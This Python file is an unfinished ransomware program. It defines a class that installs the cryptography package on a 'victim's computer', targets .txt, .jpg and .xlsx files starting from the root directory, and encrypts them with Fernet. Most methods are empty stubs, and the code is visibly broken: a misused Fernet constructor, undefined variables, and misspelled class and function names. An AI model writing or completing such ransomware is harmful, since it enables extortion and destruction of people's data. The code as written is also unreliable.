#!/usr/bin/env python3

'''
Name : Alexis Rodriguez
Date : 2020-02-18
Description : 

'''

'''
Import subprocess for executing system commands.
In this program we'll use it to download the
cryptography module in case it is not
already installed on the victim's computer
'''
import subprocess as subp
# Import time to pause execution of program
# until cryptography module gets installed
import time
# Import os so that we can obtain all the file
# in a specific directory
import os
# Import argparse to handle user arguments more conveniently
import argparse

# Try importing cryptography module class
try:
	from cryptography.fernet import Fernet
	import os
# If any errors occurs importing the cryp module
# installing it with the following command
except:
	subp.call('pip install cryptography', shell=True)
	# Wait 30 seconds before preceding with the programs
	time.sleep(30)
	# try importing again after attempting to install
	# the module
	from cryptography.fernet import Fernet

'''------------------------------------------------------------------------------------------------
									Ransomware Class Definition
---------------------------------------------------------------------------------------------------'''

class Ransomware:

	def __init__(self, directory='/',encrypt=True, key_file='fernet_key'):
		'''
		$ Declare encryption key value
		$ Get directory to encrypt/decrypt
		$ Get name of file to store key
		$ Get boolean to encrypt or decrypt files
		'''
		print("[+] Initiating ransomware declarations ")
		self.key=None
		self.enigma=None
		self.file_ext_target=['.txt', '.jpg', '.xlsx']
		self.key_file=key_file
		self.directory=directory

	def open_file_to_encrypt(self, dir):
		'''
		$ open files located in directory passed as argument
		$ return contents of file to encrypt
		'''
		pass
	def store_key(self):
		'''
		$ Store key in file for decryption
		'''
		print('[+] storing key in file')
		pass
	
	def get_key(self):
		'''
		$ Retrieve the key for decryption
		'''
		print('[+] retrieving key from file')
		pass
	
	def key_gen_fernet_instance(self):
		'''
		$ Generating encryption/decryption key
		$ Instantiating Fernet object
		'''
		# Generating keys for encryption
		k1 = Fernet.generate_key()
		k2 = Fernet.generate_key()
		# Fernet object instantiation with two keys
		self.enigma = Fernet(k1, k2)

	def encrypt(self, file_to_encrypt):
		'''
		$ Encrypting all files in the directory stored in the directory variable
		'''
		print('[+] Encrypting all files in ' + directory + ' directory')

		self.enigma.encrypt(file_to_encrypt)


	def decrypt(self):
		'''
		$ Decrypt all files in the directory stored in the directory variable
		'''
		print('[+] Decrypting all files in ' + directory + ' directory')

'''
************
----MAIN----
************
'''
def initaite():
	# Directory to encrypt
	dir_to_encyrpt = '.'
	# Instantiating Ransomware object
	instance = Ransonware(directory=dir_to_encyrpt)


# Check if current module is main module
if __name__ == '__main__':
	print('''
		  ooo,    .---.
 o`  o   /    |\\________________
o`   'oooo()  | ________   _   _)
`oo   o` \\    |/        | | | |
  `ooo'   `---'         "-" |_|
	''')

	initiate()
